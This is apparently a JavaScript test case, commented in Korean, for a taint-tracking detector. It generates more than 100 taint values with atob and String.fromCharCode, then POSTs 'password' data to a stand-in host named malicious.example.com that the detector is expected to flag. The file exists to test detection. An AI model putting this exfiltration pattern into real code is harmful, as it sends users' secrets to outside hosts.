// 테스트: 100개 이상의 Taint 값이 생성된 후 fetch를 호출하여 status=1이 되는지 확인

// 100개 이상의 Taint 값을 생성하기 위해 반복적으로 atob 호출
// atob는 TaintTracker에 의해 taint 값을 생성함
for (var i = 0; i < 120; i++) {
    // atob 호출 - 각 호출마다 새로운 Taint 값 생성
    var decoded = atob("dGVzdA==");
    
    // String.fromCharCode도 Taint 값 생성
    var char = String.fromCharCode(65 + (i % 26));
    
    // 변수에 할당하여 Taint 전파
    var taintedVar = decoded + char;
}

// 100개 이상 Taint 생성 후 fetch 실행
// 이 fetch는 status=1로 탐지되어야 함
fetch("https://malicious.example.com/exfiltrate-tainted", {
    method: "POST",
    body: JSON.stringify({
        data: "tainted_information",
        password: "stolen_with_taints"
    })
});

// 정상적인 fetch (비교용)
fetch("https://legitimate.example.com/api/data", {
    method: "GET"
});
